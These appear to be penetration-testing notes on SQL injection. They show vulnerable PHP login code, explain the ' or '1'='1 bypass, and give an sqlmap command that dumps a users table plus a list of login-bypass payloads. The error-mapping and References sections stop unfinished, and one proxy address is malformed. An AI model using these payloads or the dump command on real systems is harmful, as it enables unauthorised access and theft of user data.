# SQL-injections


## How does sql-injections work?

So we have a website that is written in php. We have a login functionality, where the code looks like this:

```
<?php
	mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());

	mysql_select_db("myHomepage");
	
	if ($_POST['uname'] != ""){
		$username = $_POST['username'];
		$password = $_POST['password'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
	}
?>
```

So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login:

```
whatever' or '1'='1
whatever' or '1'='1
```

The query will look like this:
```
$query = "SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'";
```

Since they both become true the database will retrieve all users and we will be able to bypass the login.

If you know the username you could of course use that and then only inject on the password parameter.

```
$query = "SELECT * FROM users WHERE username = 'admin' AND password='whatever' OR '1'='1'";
```



## SQLmap

Sqlmap is a great tool to perform sqlinjections.
Here is the manual.
https://github.com/sqlmapproject/sqlmap/wiki/Usage


### Dumping a database or table

Here we are dumping the database Webapp and the table Users.

```
sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
```

### Use proxy

```
--proxy="http://192.2.2.2.2:1111"
```

**Proxy credencials**
```
--proxy-cred="username:password"
```


Here is a tutorial on how to make sql-injections with post-requests.

https://hackertarget.com/sqlmap-post-request-injection/


## Login bypass



This is the most classic, standard first test:
```
' or '1'='1
```

Then you have:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

## Map out the database using error-messages

If we manage to find an error-message after a broken sql-query, we can use that to try to map out the database structure.

For example, if we have a url that end with 

```
http://example.com/photoalbum.php?id=1
```


## References